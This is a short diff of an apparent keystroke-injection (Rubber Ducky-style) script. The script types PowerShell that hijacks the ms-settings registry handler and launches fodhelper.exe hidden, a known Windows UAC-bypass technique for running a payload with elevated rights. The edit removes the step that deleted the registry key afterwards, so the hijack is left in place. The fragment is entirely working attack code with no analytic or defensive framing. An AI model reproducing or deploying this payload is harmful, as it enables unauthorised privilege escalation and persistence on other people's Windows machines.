@@ -25,7 +25,7 @@ STRING U:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecut
 DELAY 100
 STRING KCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $P -Force;Start-Process "C:\Windows\Sys
 DELAY 100
-STRING tem32\fodhelper.exe" -WindowStyle Hidden;Start-Sleep 3;Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+STRING tem32\fodhelper.exe" -WindowStyle Hidden;Start-Sleep 3
 DELAY 100
 ENTER
 
